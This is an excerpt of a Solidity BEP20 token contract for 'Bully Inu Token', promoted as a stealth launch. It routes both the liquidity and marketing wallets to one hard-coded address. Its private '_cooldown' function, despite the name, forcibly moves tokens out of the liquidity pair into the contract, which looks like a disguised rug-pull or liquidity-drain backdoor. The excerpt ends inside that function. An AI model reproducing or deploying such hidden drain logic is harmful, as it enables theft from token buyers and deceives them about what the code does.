...
Bully Inu Token - Stealth Launch

Most badass dog in the space!
...
contract BullyInuToken is Ownable, IBEP20 {
    ...
    string constant _name = "Bully Inu Token";
    string constant _symbol = "BULLINU";
    ...
    constructor() {
        ...
        autoLiquidityReceiver = 0x01C7516db30f37294D0bd67CF42d88da3E768c0c;
        marketingWallet = 0x01C7516db30f37294D0bd67CF42d88da3E768c0c;
    ...
    function _cooldown(uint256 pAmount) private {
        _transferFrom(pair, address(this), pAmount * (10 ** _decimals));
